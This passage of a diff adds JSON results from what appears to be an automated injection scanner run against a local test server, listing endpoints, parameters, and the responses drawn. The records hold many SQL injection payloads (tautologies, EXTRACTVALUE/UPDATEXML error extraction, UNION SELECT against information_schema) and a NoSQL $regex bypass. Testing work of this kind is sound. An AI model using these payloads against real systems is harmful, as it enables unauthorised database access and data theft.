+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '1' OR '1'='1--' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/blog/article?slug=%27%29+OR+%28%271%27%3D%271",
+          "Parameter": "slug",
+          "Payload": "') OR ('1'='1",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '') OR ('1'='1' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/blog/article?slug=admin%27--",
+          "Parameter": "slug",
+          "Payload": "admin'--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near 'admin'--' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/blog/article?slug=1%27+AND+EXTRACTVALUE%281%2CCONCAT%280x7e%2CVERSION%28%29%29%29--",
+          "Parameter": "slug",
+          "Payload": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '1' AND EXTRACTVALUE(1,CONCAT(0x7e",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/blog/article?slug=1%27+AND+UPDATEXML%281%2CCONCAT%280x7e%2C%28SELECT+database%28%29%29%29%2C1%29--",
+          "Parameter": "slug",
+          "Payload": "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '1' AND UPDATEXML(1,CONCAT(0x7e,(S",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/blog/article?slug=%27+UNION+SELECT+NULL--",
+          "Parameter": "slug",
+          "Payload": "' UNION SELECT NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT NULL--' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/blog/article?slug=%27+UNION+SELECT+version%28%29%2CNULL--",
+          "Parameter": "slug",
+          "Payload": "' UNION SELECT version(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT version(),NULL--'",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/blog/article?slug=%27+UNION+SELECT+database%28%29%2CNULL--",
+          "Parameter": "slug",
+          "Payload": "' UNION SELECT database(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT database(),NULL--'",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/blog/article?slug=%27+UNION+SELECT+user%28%29%2CNULL--",
+          "Parameter": "slug",
+          "Payload": "' UNION SELECT user(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT user(),NULL--' at",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/blog/article?slug=%27+UNION+SELECT+1%2C%40%40version%2C3--",
+          "Parameter": "slug",
+          "Payload": "' UNION SELECT 1,@@version,3--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT 1,@@version,3--' a",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/blog/article?slug=%27+UNION+SELECT+table_name%2CNULL+FROM+information_schema.tables--",
+          "Parameter": "slug",
+          "Payload": "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT table_name,NULL FR",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        }
+      ],
+      "tested_params": 1,
+      "tested_payloads": 24,
+      "duration_ms": 4
+    },
+    {
+      "url": "http://127.0.0.1:46033/blog/comments?post_id=1",
+      "findings": [
+        {
+          "URL": "http://127.0.0.1:46033/blog/comments?post_id=%27+UNION+SELECT+database%28%29%2CNULL--",
+          "Parameter": "post_id",
+          "Payload": "' UNION SELECT database(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "confirmed",
+          "Evidence": "données DB extraites via UNION (version/schéma)",
+          "DBMS": "",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        }
+      ],
+      "tested_params": 1,
+      "tested_payloads": 24,
+      "duration_ms": 6
+    },
+    {
+      "url": "http://127.0.0.1:46033/artists.php",
+      "findings": [
+        {
+          "URL": "http://127.0.0.1:46033/artists.php?artist=%27",
+          "Parameter": "artist",
+          "Payload": "'",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near ''' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/artists.php?artist=%27+OR+%271%27%3D%271%27--",
+          "Parameter": "artist",
+          "Payload": "' OR '1'='1'--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '' OR '1'='1'--' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/artists.php?artist=1%27+OR+%271%27%3D%271--",
+          "Parameter": "artist",
+          "Payload": "1' OR '1'='1--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '1' OR '1'='1--' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/artists.php?artist=%27%29+OR+%28%271%27%3D%271",
+          "Parameter": "artist",
+          "Payload": "') OR ('1'='1",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '') OR ('1'='1' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/artists.php?artist=admin%27--",
+          "Parameter": "artist",
+          "Payload": "admin'--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near 'admin'--' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/artists.php?artist=1%27+AND+EXTRACTVALUE%281%2CCONCAT%280x7e%2CVERSION%28%29%29%29--",
+          "Parameter": "artist",
+          "Payload": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '1' AND EXTRACTVALUE(1,CONCAT(0x7e",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/artists.php?artist=1%27+AND+UPDATEXML%281%2CCONCAT%280x7e%2C%28SELECT+database%28%29%29%29%2C1%29--",
+          "Parameter": "artist",
+          "Payload": "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '1' AND UPDATEXML(1,CONCAT(0x7e,(S",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/artists.php?artist=%27+UNION+SELECT+NULL--",
+          "Parameter": "artist",
+          "Payload": "' UNION SELECT NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT NULL--' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/artists.php?artist=%27+UNION+SELECT+version%28%29%2CNULL--",
+          "Parameter": "artist",
+          "Payload": "' UNION SELECT version(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT version(),NULL--'",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/artists.php?artist=%27+UNION+SELECT+database%28%29%2CNULL--",
+          "Parameter": "artist",
+          "Payload": "' UNION SELECT database(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT database(),NULL--'",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/artists.php?artist=%27+UNION+SELECT+user%28%29%2CNULL--",
+          "Parameter": "artist",
+          "Payload": "' UNION SELECT user(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT user(),NULL--' at",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/artists.php?artist=%27+UNION+SELECT+1%2C%40%40version%2C3--",
+          "Parameter": "artist",
+          "Payload": "' UNION SELECT 1,@@version,3--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT 1,@@version,3--' a",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/artists.php?artist=%27+UNION+SELECT+table_name%2CNULL+FROM+information_schema.tables--",
+          "Parameter": "artist",
+          "Payload": "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT table_name,NULL FR",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        }
+      ],
+      "tested_params": 1,
+      "tested_payloads": 24,
+      "duration_ms": 6
+    },
+    {
+      "url": "http://127.0.0.1:46033/review.php",
+      "findings": [
+        {
+          "URL": "http://127.0.0.1:46033/review.php",
+          "Parameter": "product_id",
+          "Payload": "'",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near ''' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/review.php",
+          "Parameter": "product_id",
+          "Payload": "' OR '1'='1'--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '' OR '1'='1'--' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/review.php",
+          "Parameter": "product_id",
+          "Payload": "1' OR '1'='1--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '1' OR '1'='1--' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/review.php",
+          "Parameter": "product_id",
+          "Payload": "') OR ('1'='1",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '') OR ('1'='1' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/review.php",
+          "Parameter": "product_id",
+          "Payload": "admin'--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near 'admin'--' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/review.php",
+          "Parameter": "product_id",
+          "Payload": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '1' AND EXTRACTVALUE(1,CONCAT(0x7e",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/review.php",
+          "Parameter": "product_id",
+          "Payload": "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: You have an error in your SQL syntax near '1' AND UPDATEXML(1,CONCAT(0x7e,(S",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/review.php",
+          "Parameter": "product_id",
+          "Payload": "' UNION SELECT NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT NULL--' at line 1",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/review.php",
+          "Parameter": "product_id",
+          "Payload": "' UNION SELECT version(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT version(),NULL--'",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/review.php",
+          "Parameter": "product_id",
+          "Payload": "' UNION SELECT database(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT database(),NULL--'",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/review.php",
+          "Parameter": "product_id",
+          "Payload": "' UNION SELECT user(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT user(),NULL--' at",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/review.php",
+          "Parameter": "product_id",
+          "Payload": "' UNION SELECT 1,@@version,3--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT 1,@@version,3--' a",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/review.php",
+          "Parameter": "product_id",
+          "Payload": "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: You have an error in your SQL syntax near '' UNION SELECT table_name,NULL FR",
+          "DBMS": "mysql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        }
+      ],
+      "tested_params": 3,
+      "tested_payloads": 72,
+      "duration_ms": 7
+    },
+    {
+      "url": "http://127.0.0.1:46033/crm/contacts",
+      "findings": [
+        {
+          "URL": "http://127.0.0.1:46033/crm/contacts?contact_id=%27",
+          "Parameter": "contact_id",
+          "Payload": "'",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/crm/contacts?contact_id=%27+OR+%271%27%3D%271%27--",
+          "Parameter": "contact_id",
+          "Payload": "' OR '1'='1'--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/crm/contacts?contact_id=1%27+OR+%271%27%3D%271--",
+          "Parameter": "contact_id",
+          "Payload": "1' OR '1'='1--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/crm/contacts?contact_id=%27%29+OR+%28%271%27%3D%271",
+          "Parameter": "contact_id",
+          "Payload": "') OR ('1'='1",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/crm/contacts?contact_id=admin%27--",
+          "Parameter": "contact_id",
+          "Payload": "admin'--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/crm/contacts?contact_id=1%27+AND+EXTRACTVALUE%281%2CCONCAT%280x7e%2CVERSION%28%29%29%29--",
+          "Parameter": "contact_id",
+          "Payload": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/crm/contacts?contact_id=1%27+AND+UPDATEXML%281%2CCONCAT%280x7e%2C%28SELECT+database%28%29%29%29%2C1%29--",
+          "Parameter": "contact_id",
+          "Payload": "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/crm/contacts?contact_id=%27+UNION+SELECT+NULL--",
+          "Parameter": "contact_id",
+          "Payload": "' UNION SELECT NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/crm/contacts?contact_id=%27+UNION+SELECT+version%28%29%2CNULL--",
+          "Parameter": "contact_id",
+          "Payload": "' UNION SELECT version(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/crm/contacts?contact_id=%27+UNION+SELECT+database%28%29%2CNULL--",
+          "Parameter": "contact_id",
+          "Payload": "' UNION SELECT database(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/crm/contacts?contact_id=%27+UNION+SELECT+user%28%29%2CNULL--",
+          "Parameter": "contact_id",
+          "Payload": "' UNION SELECT user(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/crm/contacts?contact_id=%27+UNION+SELECT+1%2C%40%40version%2C3--",
+          "Parameter": "contact_id",
+          "Payload": "' UNION SELECT 1,@@version,3--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/crm/contacts?contact_id=%27+UNION+SELECT+table_name%2CNULL+FROM+information_schema.tables--",
+          "Parameter": "contact_id",
+          "Payload": "' UNION SELECT table_name,NULL FROM information_schema.tables--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: Microsoft SQL Native Client error: Unclosed quotation mark after the character string",
+          "DBMS": "mssql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        }
+      ],
+      "tested_params": 1,
+      "tested_payloads": 24,
+      "duration_ms": 6
+    },
+    {
+      "url": "http://127.0.0.1:46033/saas/tenants/search?name=acme",
+      "findings": [
+        {
+          "URL": "http://127.0.0.1:46033/saas/tenants/search?name=%7B%22%24regex%22%3A%22.%2A%22%7D",
+          "Parameter": "name",
+          "Payload": "{\"$regex\":\".*\"}",
+          "VulnType": "nosql",
+          "Confidence": "high",
+          "Evidence": "bypass authentification NoSQL — données DB accessibles: enterprise trouvé en réponse",
+          "DBMS": "nosql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        }
+      ],
+      "tested_params": 1,
+      "tested_payloads": 24,
+      "duration_ms": 5
+    },
+    {
+      "url": "http://127.0.0.1:46033/booking/hotel",
+      "findings": [
+        {
+          "URL": "http://127.0.0.1:46033/booking/hotel?booking_ref=%27+OR+%271%27%3D%271",
+          "Parameter": "booking_ref",
+          "Payload": "' OR '1'='1 | ' AND '1'='2",
+          "VulnType": "sqli_boolean",
+          "Confidence": "medium",
+          "Evidence": "injection boolean — requêtes DB manipulables: taille de réponse significativement différente",
+          "DBMS": "",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/booking/hotel?booking_ref=%27+OR+1%3D1--",
+          "Parameter": "booking_ref",
+          "Payload": "' OR 1=1-- | ' AND 1=2--",
+          "VulnType": "sqli_boolean",
+          "Confidence": "medium",
+          "Evidence": "injection boolean — requêtes DB manipulables: taille de réponse significativement différente",
+          "DBMS": "",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        }
+      ],
+      "tested_params": 1,
+      "tested_payloads": 24,
+      "duration_ms": 6
+    },
+    {
+      "url": "http://127.0.0.1:46033/flights/search",
+      "findings": [
+        {
+          "URL": "http://127.0.0.1:46033/flights/search?from=%27",
+          "Parameter": "from",
+          "Payload": "'",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/flights/search?from=%27+OR+%271%27%3D%271%27--",
+          "Parameter": "from",
+          "Payload": "' OR '1'='1'--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/flights/search?from=1%27+OR+%271%27%3D%271--",
+          "Parameter": "from",
+          "Payload": "1' OR '1'='1--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/flights/search?from=%27%29+OR+%28%271%27%3D%271",
+          "Parameter": "from",
+          "Payload": "') OR ('1'='1",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/flights/search?from=admin%27--",
+          "Parameter": "from",
+          "Payload": "admin'--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/flights/search?from=1%27+AND+EXTRACTVALUE%281%2CCONCAT%280x7e%2CVERSION%28%29%29%29--",
+          "Parameter": "from",
+          "Payload": "1' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/flights/search?from=1%27+AND+UPDATEXML%281%2CCONCAT%280x7e%2C%28SELECT+database%28%29%29%29%2C1%29--",
+          "Parameter": "from",
+          "Payload": "1' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database())),1)--",
+          "VulnType": "sqli_error",
+          "Confidence": "confirmed",
+          "Evidence": "erreur SQL — accès DB probable: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/flights/search?from=%27+UNION+SELECT+NULL--",
+          "Parameter": "from",
+          "Payload": "' UNION SELECT NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/flights/search?from=%27+UNION+SELECT+version%28%29%2CNULL--",
+          "Parameter": "from",
+          "Payload": "' UNION SELECT version(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/flights/search?from=%27+UNION+SELECT+database%28%29%2CNULL--",
+          "Parameter": "from",
+          "Payload": "' UNION SELECT database(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
+          "URL": "http://127.0.0.1:46033/flights/search?from=%27+UNION+SELECT+user%28%29%2CNULL--",
+          "Parameter": "from",
+          "Payload": "' UNION SELECT user(),NULL--",
+          "VulnType": "sqli_union",
+          "Confidence": "high",
+          "Evidence": "erreur SQL UNION — accès DB: ERROR:  syntax error at or near \"'\" LINE 1",
+          "DBMS": "postgresql",
+          "ResponseTimeMs": 0,
+          "StatusCode": 200
+        },
+        {
